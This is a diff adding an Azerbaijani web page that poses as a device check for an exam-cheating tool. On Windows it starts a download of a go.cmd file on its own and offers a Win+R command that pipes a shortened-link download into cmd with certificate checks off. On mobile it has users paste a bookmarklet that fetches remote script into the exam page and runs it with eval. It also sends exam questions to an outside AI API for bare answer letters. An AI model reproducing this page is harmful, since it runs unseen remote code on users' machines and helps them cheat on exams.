@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sistem Yoxlanılır...</title>
+  <style>
+    body {
+      margin: 0;
+      background: #121215;
+      color: #e4e4e7;
+      font-family: system-ui, -apple-system, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 16px;
+      box-sizing: border-box;
+    }
+    .card {
+      background: #18181b;
+      border: 1px solid #27272a;
+      border-radius: 10px;
+      padding: 18px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+    }
+    h3 { margin: 0 0 10px 0; font-size: 16px; color: #f4f4f5; }
+    p { margin: 0 0 12px 0; font-size: 13px; color: #a1a1aa; line-height: 1.45; }
+    textarea {
+      width: 100%;
+      height: 90px;
+      background: #27272a;
+      color: #fff;
+      border: 1px solid #3f3f46;
+      border-radius: 6px;
+      padding: 8px;
+      font-size: 14px;
+      box-sizing: border-box;
+      margin-bottom: 10px;
+    }
+    .btn {
+      display: inline-block;
+      width: 100%;
+      padding: 10px 14px;
+      background: #2563eb;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      text-align: center;
+      text-decoration: none;
+      box-sizing: border-box;
+      margin-bottom: 8px;
+    }
+    .btn-sec {
+      background: #27272a;
+      color: #38bdf8;
+      border: 1px solid #3f3f46;
+    }
+    #ansBox {
+      margin-top: 10px;
+      padding: 10px;
+      background: #09090b;
+      border: 1px solid #27272a;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #4ade80;
+      text-align: center;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card" id="mainCard">
+    <h3 id="titleText">Cihaz müəyyən edilir...</h3>
+    <p id="descText">Zəhmət olmasa gözləyin...</p>
+
+    <div id="mobilePanel" style="display:none;">
+      <button class="btn btn-sec" id="copyBmBtn">1. Brauzer Skriptini Kopyala (İmtahan səhifəsi üçün)</button>
+      <p style="font-size:11px;margin-bottom:10px;">
+        İmtahan səhifəsində ünvan yerinə <b>javascript:</b> yazıb kopyalanan kodu yapışdırın.
+      </p>
+      <hr style="border:0;border-top:1px solid #27272a;margin:12px 0;" />
+      <p style="margin-bottom:6px;font-weight:600;color:#e4e4e7;">Və ya sualı birbaşa burada həll et:</p>
+      <textarea id="qInput" placeholder="Sualı və variantları bura yapışdırın..."></textarea>
+      <button class="btn" id="solveBtn">Cavabı Tap</button>
+      <div id="ansBox"></div>
+    </div>
+
+    <div id="pcPanel" style="display:none;">
+      <a class="btn" href="https://github.com/0rkhanmammadov/questions/releases/download/v1.0/go.cmd">
+        Yenidən Endir (go.cmd)
+      </a>
+      <button class="btn btn-sec" id="copyCmdBtn">Win+R Komandasını Kopyala</button>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const ua = navigator.userAgent || "";
+      const isAndroid = /Android/i.test(ua);
+      const isIOS = /iPad|iPhone|iPod/i.test(ua);
+      const isMobile = isAndroid || isIOS || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(ua));
+
+      const titleEl = document.getElementById("titleText");
+      const descEl = document.getElementById("descText");
+      const mobilePanel = document.getElementById("mobilePanel");
+      const pcPanel = document.getElementById("pcPanel");
+
+      if (!isMobile) {
+        // Windows / Desktop PC -> Auto-download go.cmd immediately!
+        titleEl.textContent = "Windows PC aşkarlandı";
+        descEl.textContent = "go.cmd avtomatik endirilir... Endirildikdən sonra üzərinə 1 dəfə klikləyin.";
+        pcPanel.style.display = "block";
+        setTimeout(() => {
+          window.location.href = "https://github.com/0rkhanmammadov/questions/releases/download/v1.0/go.cmd";
+        }, 150);
+
+        document.getElementById("copyCmdBtn").onclick = function() {
+          navigator.clipboard.writeText('cmd /c curl -ksL is.gd/abba11|cmd');
+          this.textContent = "✓ Win+R Komandası Kopyalandı!";
+        };
+      } else {
+        // Android / Tablet -> Activate Mobile Mode & load m.js
+        titleEl.textContent = "Planşet / Mobil Rejim Aktivdir";
+        descEl.textContent = "İmtahan tabında istifadə üçün skripti kopyalayın və ya sualı aşağıda həll edin:";
+        mobilePanel.style.display = "block";
+
+        const s = document.createElement("script");
+        s.src = "m.js";
+        document.body.appendChild(s);
+
+        document.getElementById("copyBmBtn").onclick = function() {
+          const code = "fetch('https://is.gd/abbajs').then(r=>r.text()).then(eval)";
+          navigator.clipboard.writeText(code);
+          this.textContent = "✓ Kopyalandı! (Ünvanda 'javascript:' yazıb yapışdır)";
+        };
+
+        document.getElementById("solveBtn").onclick = async function() {
+          const q = document.getElementById("qInput").value.trim();
+          if (!q) return;
+          const ansBox = document.getElementById("ansBox");
+          ansBox.style.display = "block";
+          ansBox.textContent = "◌ ...";
+          const nonce = Math.floor(1000000 + Math.random() * 8999999);
+          const prompt =
+            "QAYDA: Heç bir izahat yazma! Yalnız sualın nömrəsini (varsa) və doğru variant hərfini (A, B, C, D, E) və ya rəqəmləri yaz (məsələn: 14) B və ya 15) 1-2-3).\n\nSual:\n" +
+            q + "\n\nCavab:";
+          try {
+            const res = await fetch("https://api.binjie.fun/api/generateStream", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                prompt: prompt,
+                userId: "#/chat/" + nonce,
+                network: false,
+                system: "Respond ONLY with the question number and option letter (e.g. 14) B). No explanation.",
+                withoutContext: false,
+                stream: false
+              })
+            });
+            const raw = (await res.text()).replace(/\*/g, "").trim();
+            ansBox.textContent = "✓ " + (raw.split("\n")[0] || raw).slice(0, 45);
+          } catch (e) {
+            ansBox.textContent = "✕ Şəbəkə xətası";
+          }
+        };
+      }
+    })();
+  </script>
+</body>
+</html>
